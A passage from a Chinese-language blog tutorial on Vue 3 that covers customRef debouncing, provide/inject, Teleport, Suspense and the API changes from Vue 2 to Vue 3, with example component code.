<li><p>作用：创建一个自定义的<code>ref</code>，并对其依赖项跟踪和更新触发，进行显示控制</p>
<ul>
<li>读数据找<code>get()</code>，写数据找<code>set()</code></li>
<li>在关键的地方调用<code>track</code>和<code>trigger</code></li>
</ul>
</li>
<li><p>实现防抖效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; v-model=&quot;keyword&quot;&gt;</span><br><span class="line">	&lt;h3&gt;</span><br><span class="line">        &#123;&#123;keyword&#125;&#125;</span><br><span class="line">    &lt;/h3&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	import &#123;ref, customRef&#125; from &#x27;vue&#x27;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;Demo&#x27;,</span><br><span class="line">        setup() &#123;</span><br><span class="line">            // let keyword = ref(&#x27;hello&#x27;) // 使用vue准备好的内置的ref</span><br><span class="line">            // 自定义一个myRef</span><br><span class="line">            function myRef(value, delay) &#123;</span><br><span class="line">                let timer</span><br><span class="line">                // 通过customRef去实现自定义</span><br><span class="line">                return customRef((track, trigger) =&gt; &#123;</span><br><span class="line">                	return &#123;</span><br><span class="line">                        get() &#123;</span><br><span class="line">                            track() // 告诉vue这个value值是需要被“追踪”的</span><br><span class="line">                            return value</span><br><span class="line">                        &#125;,</span><br><span class="line">                        set(newValue) &#123;</span><br><span class="line">                            clearTimeout(timer)</span><br><span class="line">                            timer = setTimeout(() =&gt; &#123;</span><br><span class="line">								value = newValue	</span><br><span class="line">                                trigger() // 告诉vue去更新页面</span><br><span class="line">                            &#125;, delay)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            let keyword = myRef(&#x27;hello&#x27;, 500)</span><br><span class="line">            return &#123;</span><br><span class="line">                keyword</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="8-4-5-provide与inject"><a href="#8-4-5-provide与inject" class="headerlink" title="8.4.5.provide与inject"></a>8.4.5.<code>provide</code>与<code>inject</code></h3><p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220620163000601.png" alt="image-20220620163000601"></p>
<ul>
<li><p>作用：实现<strong>祖组件</strong>与<strong>后代组件</strong>间通信</p>
<ul>
<li>虽然也可以用来父子组件通信，但那样直接用<code>props</code>即可</li>
</ul>
</li>
<li><p>套路：父组件有一个<code>provide</code>选项来提供数据，后代组件有一个<code>inject</code>选项来开始使用这些数据</p>
</li>
<li><p>具体写法：</p>
<ul>
<li><p>1.祖先组件中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;provide&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">provide</span>(<span class="string">&#x27;person&#x27;</span>, person)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>2.孙子组件中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;inject&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">const</span> person = <span class="title function_">inject</span>(<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;person&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="8-4-6-响应式数据的判断"><a href="#8-4-6-响应式数据的判断" class="headerlink" title="8.4.6.响应式数据的判断"></a>8.4.6.响应式数据的判断</h3><ul>
<li><code>isRef</code>：检查一个值，是否为一个<code>ref</code>对象</li>
<li><code>isReactive</code>：检查一个对象，是否是由<code>reactive</code>创建的响应式代理</li>
<li><code>isReadonly</code>：检查一个对象，是否是由<code>readonly</code>创建的只读代理</li>
<li><code>isProxy</code>：检查一个对象，是否是由<code>reactive</code>或者<code>readonly</code>方法创建的代理</li>
</ul>
<h2 id="8-5-Composition-API的优势"><a href="#8-5-Composition-API的优势" class="headerlink" title="8.5.Composition API的优势"></a>8.5.<code>Composition API</code>的优势</h2><h3 id="8-5-1-Options-API存在的问题"><a href="#8-5-1-Options-API存在的问题" class="headerlink" title="8.5.1.Options API存在的问题"></a>8.5.1.<code>Options API</code>存在的问题</h3><p>使用传统<code>Options API</code>，新增或者修改一个需求，就需要分别在<code>data</code>、<code>methods</code>、<code>computed</code>里修改</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220620164219772.png" alt="image-20220620164219772"></p>
<p>如果一个组件里的功能特别多</p>
<ul>
<li>一个功能的数据、方法、计算属性都是拆散的</li>
<li>每个配置项里堆积了不同功能的代码</li>
<li>维护某一个功能代码时，就需要打开一个庞大的<code>data</code>找啊找，然后再打开一个庞大的<code>method</code>找啊找，可能还要去<code>computed</code>、<code>watch</code>、生命周期钩子里不断的查找修改</li>
</ul>
<h3 id="8-5-2-Composition-API的优势"><a href="#8-5-2-Composition-API的优势" class="headerlink" title="8.5.2.Composition API的优势"></a>8.5.2.<code>Composition API</code>的优势</h3><p>我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220620165208346.png" alt="image-20220620165208346"></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220620164953100.png" alt="image-20220620164953100"></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220620165019824.png" alt="image-20220620165019824"></p>
<h2 id="8-6-新的组件"><a href="#8-6-新的组件" class="headerlink" title="8.6.新的组件"></a>8.6.新的组件</h2><h3 id="8-6-1-Fragment"><a href="#8-6-1-Fragment" class="headerlink" title="8.6.1.Fragment"></a>8.6.1.<code>Fragment</code></h3><ul>
<li><p>在<code>vue2</code>中，组件必须有一个根标签</p>
</li>
<li><p>在<code>vue3</code>中，组件可以没有根标签，内部会将多个标签包含在一个<code>Fragment</code>虚拟元素中</p>
<ul>
<li>好处：减少标签层级，减小内存占用</li>
</ul>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220620170100495.png" alt="image-20220620170100495"></p>
</li>
</ul>
<h3 id="8-6-2-Teleport"><a href="#8-6-2-Teleport" class="headerlink" title="8.6.2.Teleport"></a>8.6.2.<code>Teleport</code></h3><ul>
<li><p><code>Teleport</code>是一种能够将我们的<strong>组件<code>html</code>结构</strong>移动到指定位置的技术</p>
</li>
<li><p>后代组件中，直接显示的弹窗，会被包裹在<code>dom</code>结构内，即使可以使用定位，但组件嵌套一多，写起来也麻烦</p>
<ul>
<li><code>移动位置</code>可写的值：<ul>
<li><code>body</code><ul>
<li>组件的嵌套再多，渲染的<code>dom</code>结构，也是直接在<code>body</code>下的</li>
</ul>
</li>
<li><code>css</code>选择器</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;teleport to=&#x27;移动位置&#x27;&gt;</span><br><span class="line">	&lt;div v-if=&#x27;isShow&#x27; class=&#x27;mask&#x27;&gt;</span><br><span class="line">        &lt;div class=&#x27;dialog&#x27;&gt;</span><br><span class="line">            &lt;h3&gt;</span><br><span class="line">                我是一个弹窗</span><br><span class="line">            &lt;/h3&gt;</span><br><span class="line">            &lt;button @click=&#x27;isShow=false&#x27;&gt;</span><br><span class="line">                关闭弹窗</span><br><span class="line">            &lt;/button&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/teleport&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="8-6-3-Suspense"><a href="#8-6-3-Suspense" class="headerlink" title="8.6.3.Suspense"></a>8.6.3.<code>Suspense</code></h3><ul>
<li><p>等待异步组件时渲染一些后备内容，获得更好地用户体验</p>
<ul>
<li><code>Suspense</code>底层是用插槽实现的<ul>
<li><code>v-slot:defalut</code><ul>
<li>用于放置本应该展示的组件</li>
</ul>
</li>
<li><code>v-slot:fallback</code><ul>
<li>组件未加载时，展示的内容</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>使用步骤：</p>
<ul>
<li><p>1.异步引入组件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;defineAsyncComponent&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// import Child from &#x27;./components/Child.vue&#x27; // 静态引入（同步引入）</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Child</span> = <span class="title function_">defineAsyncComponent</span>(<span class="function">() =&gt;</span> <span class="title function_">import</span>(<span class="string">&#x27;./components/Child.vue&#x27;</span>)) <span class="comment">// 动态引入（异步引入）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>2.使用<code>Suspence</code>包裹组件，并配置好<code>default</code>与<code>fallback</code></p>
<p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div class=&#x27;app&#x27;&gt;</span><br><span class="line">        &lt;h3&gt;</span><br><span class="line">        	我是App组件    </span><br><span class="line">    	&lt;/h3&gt;</span><br><span class="line">        &lt;Suspence&gt;</span><br><span class="line">    		&lt;template v-slot:default&gt;</span><br><span class="line">				&lt;Child/&gt;</span><br><span class="line">			&lt;/template&gt;</span><br><span class="line">			&lt;template v-slot:fallback&gt;</span><br><span class="line">				&lt;h3&gt;</span><br><span class="line">                    加载中...</span><br><span class="line">                &lt;/h3&gt;</span><br><span class="line">			&lt;/template&gt;</span><br><span class="line">    	&lt;/Suspence&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>同步引入情况下，会等到所有的组件引入加载完，才会展示</li>
<li>异步引入情况下，被设置成异步引入的组件，不会阻塞整个页面的加载</li>
</ul>
</li>
<li><p>之前说<code>setup</code>不能返回<code>Promise</code>，那是因为没有讲到这里，其实是可以的</p>
<p><code>Child.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div class=&quot;child&quot;&gt;</span><br><span class="line">		&lt;h3&gt;我是Child组件&lt;/h3&gt;</span><br><span class="line">		&#123;&#123;sum&#125;&#125;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line">	export default &#123;</span><br><span class="line">		name: &#x27;Child&#x27;,</span><br><span class="line">		setup() &#123;</span><br><span class="line">			let sum = ref(0)</span><br><span class="line">			return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">				setTimeout(() =&gt; &#123;</span><br><span class="line">					resolve(sum)</span><br><span class="line">				&#125;, 1000)</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>或者写成<code>async</code>形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div class=&quot;child&quot;&gt;</span><br><span class="line">		&lt;h3&gt;我是Child组件&lt;/h3&gt;</span><br><span class="line">		&#123;&#123;sum&#125;&#125;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line">	export default &#123;</span><br><span class="line">		name: &#x27;Child&#x27;,</span><br><span class="line">		async setup() &#123;</span><br><span class="line">			let sum = ref(0)</span><br><span class="line">			let p = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">				setTimeout(() =&gt; &#123;</span><br><span class="line">					resolve(sum)</span><br><span class="line">				&#125;, 1000)</span><br><span class="line">			&#125;)</span><br><span class="line">            return await p</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可以配合<code>Suspence</code>使用</p>
</li>
</ul>
</li>
</ul>
<h2 id="8-7-其他"><a href="#8-7-其他" class="headerlink" title="8.7.其他"></a>8.7.其他</h2><h3 id="8-7-1-全局API的转移"><a href="#8-7-1-全局API的转移" class="headerlink" title="8.7.1.全局API的转移"></a>8.7.1.全局<code>API</code>的转移</h3><ul>
<li><p><code>vue2</code>有许多全局<code>API</code>和配置</p>
<ul>
<li><p>例如：注册全局组件、注册全局指令等</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册全局组件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;MyButton&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">data</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">        <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`&lt;button @click=&quot;count++&gt;Clicked &#123;&#123;count&#125;&#125; times.&lt;/button&gt;`</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册全局指令</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;focus&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">inserted</span>: <span class="function"><span class="params">el</span> =&gt;</span> el.<span class="title function_">focus</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>vue3</code>中对这些<code>API</code>做出了调整</p>
<ul>
<li><p>将全局的<code>API</code>，即<code>Vue.xxx</code>调整到应用实例<code>app</code>上</p>
<table>
<thead>
<tr>
<th>2.x全局API（Vue）</th>
<th>3.x实例API（app）</th>
</tr>
</thead>
<tbody><tr>
<td>Vue.config.xxx</td>
<td>app.config.xxx</td>
</tr>
<tr>
<td>Vue.config.productionTip</td>
<td>移除</td>
</tr>
<tr>
<td>Vue.component</td>
<td>app.component</td>
</tr>
<tr>
<td>Vue.directive</td>
<td>app.directive</td>
</tr>
<tr>
<td>Vue.mixin</td>
<td>app.mixin</td>
</tr>
<tr>
<td>Vue.use</td>
<td>app.use</td>
</tr>
<tr>
<td>Vue.prototype</td>
<td>app.config.globalProperties</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h2 id="8-7-2-其他改变"><a href="#8-7-2-其他改变" class="headerlink" title="8.7.2.其他改变"></a>8.7.2.其他改变</h2><ul>
<li><p><code>data</code>选项应始终被声明为一个函数</p>
</li>
<li><p>过度类名的更改</p>
<ul>
<li><p><code>vue2</code>的写法</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.v-enter</span>, <span class="selector-class">.v-leave-to</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.v-leave</span>, <span class="selector-class">.v-enter-to</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>vue3</code>的写法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.<span class="property">v</span>-enter-<span class="keyword">from</span>, .<span class="property">v</span>-leave-to &#123;</span><br><span class="line">    <span class="attr">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">.<span class="property">v</span>-leave-<span class="keyword">from</span>, .<span class="property">v</span>-enter-to &#123;</span><br><span class="line">    <span class="attr">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>移除<code>keyCode</code>作为<code>v-on</code>的修饰符，同时也不再支持<code>config.keyCodes</code></p>
</li>
<li><p>移除<code>v-on.native</code>修饰符</p>
<ul>
<li><p>父组件中绑定事件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;my-component </span><br><span class="line">              v-on:close = &quot;handleComponentEvent&quot;</span><br><span class="line">              v-on:click = &quot;handleNativeClickEvent&quot;</span><br><span class="line">              /&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>子组件中声明自定义事件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	export default &#123;</span><br><span class="line">        emits: [&#x27;close&#x27;] // 没指定的，会认为是原生事件</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>移除过滤器（<code>filter</code>）</p>
<ul>
<li>过滤器虽然看起来很方便，但它需要一个自定义语法，打破大括号内表达式“只是JavaScript”的假设，这不仅有学习成本，而且有实现成本</li>
<li>建议用方法调用或计算属性去替换过滤器</li>
</ul>
</li>
<li><p>其他</p>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Saiable">Sai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mindcons.cn/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/">http://mindcons.cn/2022/07/25/web/JavaScript/vue_教程3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mindcons.cn" target="_blank">吕小布の博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/07/02/xjocPR8fnLu64KU.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://s2.loli.net/2022/07/02/ZYspTWmDdytfLXa.png" target="_blank"><img class="post-qr-code-img" src="https://s2.loli.net/2022/07/02/ZYspTWmDdytfLXa.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://s2.loli.net/2022/07/02/3zcRHPK5m6C8sE2.png" target="_blank"><img class="post-qr-code-img" src="https://s2.loli.net/2022/07/02/3zcRHPK5m6C8sE2.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/25/web/%E5%85%B6%E4%BB%96/%E8%BF%90%E7%BB%B4/Neovim/%E3%80%8ANeovim%20%E9%85%8D%E7%BD%AE%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E0%E5%88%B01%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84IDE%E3%80%8B/"><img class="prev-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Neovim 配置实战：从0到1打造自己的IDE</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/19/web/JavaScript/TypeScript/"><img class="next-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TypeScript基础</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/07/02/xjocPR8fnLu64KU.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Sai</div><div class="author-info__description">无来无去,不悔不怨</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">66</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Saiable"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="WeChat"><i class="fa-brands fa-weixin"></i></a><a class="social-icon" href="https://github.com/Saiable" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fa-solid fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">时间再多一点的愿望无法满足，那就多清醒一会儿</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%BE%E7%A8%8B%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">课程简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-vue%E6%A0%B8%E5%BF%83"><span class="toc-number">2.</span> <span class="toc-text">1.vue核心</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-vue%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">1.1.vue简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-vue%E5%AE%98%E7%BD%91%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.1.1.vue官网使用指南</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-2-%E4%BB%8B%E7%BB%8D%E4%B8%8E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">1.1.2.介绍与描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-3-vue%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">2.1.3.</span> <span class="toc-text">1.1.3.vue的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-4-%E6%90%AD%E5%BB%BAvue%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.4.</span> <span class="toc-text">1.1.4.搭建vue开发环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E5%88%9D%E8%AF%86vue"><span class="toc-number">2.2.</span> <span class="toc-text">1.2.初识vue</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-HelloWorld%E5%B0%8F%E6%A1%88%E4%BE%8B"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.2.1.HelloWorld小案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-%E5%B0%8F%E7%BB%93%EF%BC%9A%E5%88%86%E6%9E%90Helloworld%E5%B0%8F%E6%A1%88%E4%BE%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">1.2.2.小结：分析Helloworld小案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">1.3.模板语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-1-%E6%95%88%E6%9E%9C"><span class="toc-number">2.3.1.</span> <span class="toc-text">1.3.1.效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-2-%E5%B0%8F%E7%BB%93%EF%BC%9A%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95"><span class="toc-number">2.3.2.</span> <span class="toc-text">1.3.2.小结：模板语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A"><span class="toc-number">2.4.</span> <span class="toc-text">1.4.数据绑定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 